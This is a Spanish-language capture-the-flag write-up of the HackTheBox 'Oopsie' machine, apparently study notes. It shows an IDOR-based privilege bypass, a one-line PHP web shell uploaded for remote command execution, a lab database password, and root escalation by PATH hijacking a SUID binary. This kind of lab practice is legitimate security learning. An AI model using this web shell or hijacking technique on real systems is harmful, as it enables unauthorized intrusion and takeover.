# Oopsie

Plataforma: HackTheBox
OS: Linux
Level: Very Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 24 de diciembre de 2024 16:01
IP: 10.129.105.138

## Recopilación de información

<aside>
💡 Reconocimiento inicial

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.105.138 -oG allports
```

![image.png](<imagenes/image 46.png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p22,80 -sCV 10.129.105.138 -oN targeted
```

![image.png](<imagenes/image 47.png>)

- **Identificación de vulnerabilidades**
    - 22 SSH: Encotramos clave SSH RSA
    
    ![image.png](<imagenes/image 48.png>)
    
    - 80
    
    ```bash
    whatweb 10.129.105.138
    ```
    

![image.png](<imagenes/image 49.png>)

```bash
feroxbuster --url http://10.129.105.138

```

![image.png](<imagenes/image 50.png>)

Encontramos ruta : /cdn-cgi/login

![image.png](<imagenes/image 51.png>)

Al no disponer de credenciales, accedmos como “Guest”

Enumeramos la web :

Account con ID = 2

![image.png](<imagenes/image 52.png>)

Cambiamos el ID a 1 y encontramos usuario admin con ID: 34322

Lo mismo para las otras secciones. Encontramos clients y al cambiar el ID sacamos usuario

Mail : john@tafcz.co.uk

Name: Tafcz

![image.png](<imagenes/image 53.png>)

## Explotación

<aside>
💡

</aside>

### Explotación 1

Mediante Burpsuite, interceptamos la peticion y cambiamos el id por el 34322 y admin , para acceder al panel “Upload” 

![image.png](<imagenes/image 54.png>)

![image.png](<imagenes/image 55.png>)

Probamos a subir el una shell para RCE :

```bash
<?php echo "<pre>" . system($_GET['cmd']) . "</pre>"; ?>
```

![image.png](<imagenes/image 56.png>)

Tratamos de acceder:

![image.png](<imagenes/image 57.png>)

Tenemos ejecucción remota de comandos

Tratamos de ejecutar una revershell:

Subimos revershell de pentestmonkey y obtenemos revershell 

![image.png](<imagenes/image 58.png>)

### 

## Explotación posterior

<aside>
💡 Escalamos privilegios desde www-data

</aside>

### Escalada de privilegios

Una vez accedemos, enumeramos el sistema y encontramos como migrar a usuario robert en db.php

![image.png](<imagenes/image 59.png>)

User: robert

Password: M3g4C0rpUs3r!

![image.png](<imagenes/image 60.png>)

Buscamos binarios SUID. 

No podemos ejecutar sudo -l

Hacemos

```bash
find / -perm -u=s -type f 2>/dev/null

/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/bugtracker
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
```

De los binarios que aparece, investigamos bugtracker

```bash
bugtracker

robert@oopsie:~$ bugtracker     

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 23453
---------------

cat: /root/reports/23453: No such file or directory
```

Haciendo un strings del binario, vemos que ejecuta cat con ruta relativa:

```bash
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 
---------------
cat /root/reports/
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
```

Provamos a hacer un Path hijacking para CAT:

```bash
robert@oopsie:/usr/bin$ cd /home

robert@oopsie:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

robert@oopsie:~$ export PATH=.:$PATH
robert@oopsie:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
robert@oopsie:~$ echo 'bash -p' > cat
robert@oopsie:~$ chmod +x cat
robert@oopsie:~$ ls -l
total 8
-rwxrwxr-x 1 robert robert  8 Dec 24 20:44 cat
-rw-r--r-- 1 robert robert 33 Feb 25  2020 user.txt

robert@oopsie:~$ bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: wer
---------------

root@oopsie:~# whoami
root
```

Buscamos la flag :

```bash
root@oopsie:/# cd root
root@oopsie:/root# ls
reports  root.txt
root@oopsie:/root# cat root.txt 
af13b0bee69f8a877c3faf667f7beacf
```

## Conclusión

<aside>
💡 Maquina facil. Para recordar buscar binarios SUID a mano si no funciona sudo -l y tener presente siempre el acceso a binarios con rutas relativas

</aside>